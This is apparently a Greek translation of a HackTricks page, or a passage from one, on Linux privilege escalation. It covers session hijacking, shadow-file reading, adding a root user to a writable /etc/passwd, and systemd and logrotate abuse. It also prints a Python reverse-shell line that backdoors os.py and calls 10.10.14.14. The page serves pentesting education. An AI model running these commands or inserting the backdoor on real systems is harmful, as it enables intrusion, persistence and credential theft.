Οι Λίστες Ελέγχου Πρόσβασης (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανές να **αντικαθιστούν τα παραδοσιακά δικαιώματα ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λάβετε** αρχεία με συγκεκριμένα ACL από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές συνεδρίες κελύφους

Σε **παλιές εκδόσεις** μπορεί να **υφαρπάξετε** κάποιες **συνεδρίες κελύφους** ενός διαφορετικού χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείτε να **συνδεθείτε** μόνο σε συνεδρίες οθόνης του **δικού σας χρήστη**. Ωστόσο, θα μπορούσατε να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### Υφαρπαγή συνεδριών οθόνης

**Λίστα συνεδριών οθόνης**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Σύνδεση σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Αυτό ήταν ένα πρόβλημα με **παλιές εκδόσεις tmux**. Δεν μπόρεσα να υποκλέψω μια συνεδρία tmux (v2.1) που δημιουργήθηκε από τον root ως μη προνομιούχος χρήστης.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Σύνδεση σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH κλειδιά που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κ.λπ.) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 μπορεί να επηρεάζονται από αυτό το σφάλμα.\
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία ενός νέου ssh κλειδιού σε αυτά τα λειτουργικά συστήματα, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι δυνατότητες μπορούν να υπολογιστούν και **έχοντας το δημόσιο κλειδί ssh μπορείτε να αναζητήσετε το αντίστοιχο ιδιωτικό κλειδί**. Μπορείτε να βρείτε τις υπολογισμένες δυνατότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

* **PasswordAuthentication:** Καθορίζει εάν επιτρέπεται η αυθεντικοποίηση με κωδικό πρόσβασης. Η προεπιλογή είναι `no`.
* **PubkeyAuthentication:** Καθορίζει εάν επιτρέπεται η αυθεντικοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
* **PermitEmptyPasswords**: Όταν επιτρέπεται η αυθεντικοποίηση με κωδικό πρόσβασης, καθορίζει εάν ο διακομιστής επιτρέπει την είσοδο σε λογαριασμούς με κενές συμβολοσειρές κωδικού πρόσβασης. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει εάν ο root μπορεί να συνδεθεί χρησιμοποιώντας ssh, η προεπιλογή είναι `no`. Δυνατές τιμές:

* `yes`: ο root μπορεί να συνδεθεί χρησιμοποιώντας κωδικό πρόσβασης και ιδιωτικό κλειδί
* `without-password` ή `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
* `forced-commands-only`: Ο root μπορεί να συνδεθεί μόνο χρησιμοποιώντας ιδιωτικό κλειδί και εάν οι επιλογές εντολών είναι καθορισμένες
* `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα δημόσια κλειδιά που μπορούν να χρησιμοποιηθούν για την αυθεντικοποίηση χρηστών. Μπορεί να περιέχει tokens όπως το `%h`, το οποίο θα αντικατασταθεί από τον κατάλογο του χρήστη. **Μπορείτε να υποδείξετε απόλυτους διαδρομές** (ξεκινώντας από `/`) ή **σχετικές διαδρομές από το σπίτι του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η ρύθμιση θα υποδείξει ότι αν προσπαθήσετε να συνδεθείτε με το **ιδιωτικό** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το δημόσιο κλειδί σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Η προώθηση του SSH agent σας επιτρέπει να **χρησιμοποιείτε τα τοπικά σας SSH κλειδιά αντί να αφήνετε κλειδιά** (χωρίς κωδικούς πρόσβασης!) να βρίσκονται στον διακομιστή σας. Έτσι, θα μπορείτε να **πηδήξετε** μέσω ssh **σε έναν υπολογιστή** και από εκεί **να πηδήξετε σε έναν άλλο** υπολογιστή **χρησιμοποιώντας** το **κλειδί** που βρίσκεται στον **αρχικό σας υπολογιστή**.

Πρέπει να ρυθμίσετε αυτή την επιλογή στο `$HOME/.ssh.config` όπως αυτό:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταπηδά σε μια διαφορετική μηχανή, αυτή η μηχανή θα μπορεί να έχει πρόσβαση στα κλειδιά (το οποίο είναι ένα ζήτημα ασφαλείας).

Το αρχείο `/etc/ssh_config` μπορεί να **αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να αρνηθεί αυτή τη ρύθμιση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **αρνηθεί** τη μεταφορά ssh-agent με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι επιτρεπτή).

Αν διαπιστώσετε ότι η Forward Agent είναι ρυθμισμένη σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα καθώς **μπορείτε να το εκμεταλλευτείτε για να κερδίσετε δικαιώματα**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Ενδιαφέροντα Αρχεία

### Αρχεία Προφίλ

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **σενάρια που εκτελούνται όταν ένας χρήστης τρέχει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να κερδίσετε δικαιώματα**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρείτε κάποιο περίεργο προφίλ script, θα πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα, τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετικό όνομα ή μπορεί να υπάρχει ένα αντίγραφο ασφαλείας. Επομένως, συνιστάται να **βρείτε όλα αυτά** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή ισοδύναμο).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Πρώτον, δημιουργήστε έναν κωδικό πρόσβασης με μία από τις παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια, προσθέστε τον χρήστη `hacker` και προσθέστε τον παραγόμενο κωδικό πρόσβασης.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν ψεύτικο χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να υποβαθμίσετε την τρέχουσα ασφάλεια της μηχανής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD, το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και το `/etc/master.passwd`, επίσης το `/etc/shadow` έχει μετονομαστεί σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο διαμόρφωσης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή εκτελεί έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο ρύθμισης υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Η πίσω πόρτα σας θα εκτελείται την επόμενη φορά που θα ξεκινήσει το tomcat.

### Έλεγχος Φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανώς δεν θα μπορείτε να διαβάσετε τον τελευταίο αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενοι Τοποθεσίες/Κατεχόμενα αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία στα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_ιστορικό, .sudo\_ως\_διαχειριστής\_επιτυχές, προφίλ, bashrc, httpd.conf, .σχέδιο, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Σενάρια/Δυαδικά αρχεία στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία ιστού**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), αναζητά **πολλά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε γι' αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια ανοιχτού κώδικα εφαρμογή που χρησιμοποιείται για την ανάκτηση πολλών κωδικών που είναι αποθηκευμένοι σε τοπικό υπολογιστή για Windows, Linux & Mac.

### Καταγραφές

Αν μπορείτε να διαβάσετε καταγραφές, μπορεί να είστε σε θέση να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτές**. Όσο πιο παράξενη είναι η καταγραφή, τόσο πιο ενδιαφέρουσα θα είναι (πιθανώς).\
Επίσης, κάποιες "**κακώς**" ρυθμισμένες (backdoored?) **καταγραφές ελέγχου** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς** μέσα σε καταγραφές ελέγχου όπως εξηγείται σε αυτή την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα αρχεία καταγραφής, η ομάδα** [**adm**](interesting-groups-linux-pe/#adm-group) θα είναι πολύ χρήσιμη.

### Shell αρχεία
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή regexps hashes.\
Δεν θα παραθέσω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Αν γνωρίζετε από **πού** θα εκτελεστεί ένα python script και μπορείτε να **γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε τις βιβλιοθήκες python**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη OS και να την backdoor (αν μπορείτε να γράψετε εκεί όπου θα εκτελείται το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor την βιβλιοθήκη** απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την παρακάτω γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή στους γονικούς του φακέλους να αποκτήσουν πιθανώς ανυψωμένα δικαιώματα. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά εκτελείται ως **root**, μπορεί να χειραγωγηθεί για να εκτελεί αυθαίρετα αρχεία, ειδικά σε φακέλους όπως το _**/etc/bash\_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε φάκελο όπου εφαρμόζεται η περιστροφή καταγραφών.

{% hint style="info" %}
Αυτή η ευπάθεια επηρεάζει την έκδοση `logrotate` `3.18.0` και παλαιότερες
{% endhint %}

Περισσότερες λεπτομέρειες σχετικά με την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(αρχεία καταγραφής nginx),** οπότε όποτε διαπιστώσετε ότι μπορείτε να τροποποιήσετε τα αρχεία καταγραφής, ελέγξτε ποιος διαχειρίζεται αυτά τα αρχεία και ελέγξτε αν μπορείτε να ανυψώσετε δικαιώματα αντικαθιστώντας τα αρχεία καταγραφής με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης είναι σε θέση να **γράψει** ένα σενάριο `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **προσαρμόσει** ένα υπάρχον, τότε το **σύστημα σας είναι pwned**.

Τα σενάρια δικτύου, όπως το _ifcg-eth0_, χρησιμοποιούνται για συνδέσεις δικτύου. Φαίνονται ακριβώς όπως τα αρχεία .INI. Ωστόσο, είναι \~sourced\~ στο Linux από τον Network Manager (dispatcher.d).

Στην περίπτωσή μου, το `NAME=` που αποδίδεται σε αυτά τα σενάρια δικτύου δεν διαχειρίζεται σωστά. Αν έχετε **λευκό/κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το μέρος μετά το λευκό/κενό διάστημα**. Αυτό σημαίνει ότι **όλα μετά τον πρώτο κενό χώρο εκτελούνται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, και rc.d**

Ο φάκελος `/etc/init.d` είναι το σπίτι των **scripts** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart`, και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελούνται άμεσα ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Ένας εναλλακτικός δρόμος στα συστήματα Redhat είναι το `/etc/rc.d/init.d`.

Από την άλλη πλευρά, το `/etc/init` σχετίζεται με το **Upstart**, μια νεότερη **διαχείριση υπηρεσιών** που εισήχθη από το Ubuntu, χρησιμοποιώντας αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα scripts του SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις του Upstart λόγω ενός επιπέδου συμβατότητας στο Upstart.

**systemd** αναδύεται ως μια σύγχρονη διαχείριση εκκίνησης και υπηρεσιών, προσφέροντας προηγμένα χαρακτηριστικά όπως εκκίνηση daemon κατ' απαίτηση, διαχείριση automount και στιγμιότυπα κατάστασης συστήματος. Οργανώνει αρχεία στο `/usr/lib/systemd/` για πακέτα διανομής και `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης του συστήματος.

## Άλλες Τεχνικές

### NFS Privilege escalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Διαφυγή από περιορισμένα Shells

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Προστασίες Ασφαλείας Πυρήνα

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Εργαλεία Privesc Linux/Unix

### **Καλύτερο εργαλείο για αναζήτηση τοπικών διαδρομών ανύψωσης δικαιωμάτων Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Εντοπισμός ευπαθειών πυρήνα σε linux και MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (φυσική πρόσβαση):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Συλλογή περισσότερων scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Αναφορές

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
